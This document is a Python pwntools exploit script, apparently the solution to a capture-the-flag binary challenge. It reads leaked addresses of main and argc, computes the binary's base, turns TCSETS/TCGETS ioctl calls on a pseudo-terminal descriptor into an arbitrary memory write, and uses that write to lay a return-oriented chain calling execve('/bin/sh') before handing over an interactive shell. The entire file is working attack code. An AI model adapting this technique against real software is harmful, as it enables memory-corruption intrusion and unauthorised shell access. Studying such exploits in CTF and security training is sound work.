#!/usr/bin/env python3

from pwn import *

TCGETS = 0x5401
TCSETS = 0x5402

ARGC_OFFSET = -0x4C
ARG2_OFFSET = -0x20
MAIN_OFFSET = 0x13AA


#0x00001294: pop rax ; ret  ;  \x58\xc3 (1 found)
OFFSET_POP_RAX = 0x00001294
#0x0000129e: pop rdi ; ret  ;  \x5f\xc3 (1 found)
OFFSET_POP_RDI = 0x0000129e
#0x0000129c: pop rsi ; ret  ;  \x5e\xc3 (1 found)
OFFSET_POP_RSI = 0x0000129c
#0x0000129a: pop rdx ; ret  ;  \x5a\xc3 (1 found)
OFFSET_POP_RDX = 0x0000129a
#0x00001344: syscall  ;  \x0f\x05 (1 found)
OFFSET_SYSCALL = 0x00001344

io = process("./bin/challenge")
#io = gdb.debug("./bin/challenge")


def ioctl(io, fd, cmd, more=True, *args):
    io.recvline_contains(b"What fd do you want?")
    io.sendline(f"{fd:#x}".encode())
    io.recvline_contains(b"What ioctl do you want to call?")
    io.sendline(f"{cmd:#x}".encode())
    io.recvline_contains(b"How many arguments do you want?")
    io.sendline(f"{len(args):#x}".encode())
    for arg in args:
        io.recvline_contains(b"What do you want for arg")
        io.sendline(f"{arg:#x}".encode())

    io.recvuntil(b"ioctl returned ")
    ret = int(io.recvline().decode().strip(), 16)

    io.recvline_contains(b"Do another (0/1)?")
    io.sendline(f"{int(more)}".encode())

    return ret


def leaks(io):
    io.recvuntil(b"posix_openpt() returned ")
    posix_fd = int(io.recvline().decode().strip(), 16)
    parts = io.recvline_contains(b"main is").decode().strip().split()
    addr_main, addr_argc = parts[2], parts[6]

    addr_main = int(addr_main, 16)
    addr_argc = int(addr_argc, 16)

    return posix_fd, addr_main, addr_argc


def write64(io, arg2_addr, more, addr, value):
    ioctl(io, posix_fd, 0, True, 0, value)
    ioctl(io, posix_fd, TCSETS, True, arg2_addr)
    ioctl(io, posix_fd, TCGETS, more, addr)


# Get info leaks and calculate important addresses
posix_fd, addr_main, addr_argc = leaks(io)
log.info("posix_openpt: %d", posix_fd)
addr_base = addr_main - MAIN_OFFSET
log.info("Addr main: %#x", addr_main)
log.info("Addr base: %#x", addr_base)
log.info("Addr argc: %#x", addr_argc)
arg2_addr = addr_argc - ARGC_OFFSET + ARG2_OFFSET

# Create a execve("/bin/sh", NULL, NULL) ROP chain
rop_chain = [
    addr_base + OFFSET_POP_RAX, constants.linux.amd64.SYS_execve,
    addr_base + OFFSET_POP_RDI, 0x1337,
    addr_base + OFFSET_POP_RSI, 0,
    addr_base + OFFSET_POP_RDX, 0,
    addr_base + OFFSET_SYSCALL,
    b'/bin/sh\0'
]

rip_addr = addr_argc - ARGC_OFFSET
# Calculate address of "/bin/sh" and update ROP chain
rop_chain[3] = rip_addr + 8*(len(rop_chain)-1)

# Write the ROP chain
for i, element in enumerate(rop_chain):
    if isinstance(element, bytes):
        element = u64(element)

    addr = rip_addr + 8*i
    last = (i+1)==len(rop_chain)
    write64(io, arg2_addr, more=not last, addr=addr, value=element)

# Get shell
io.interactive()
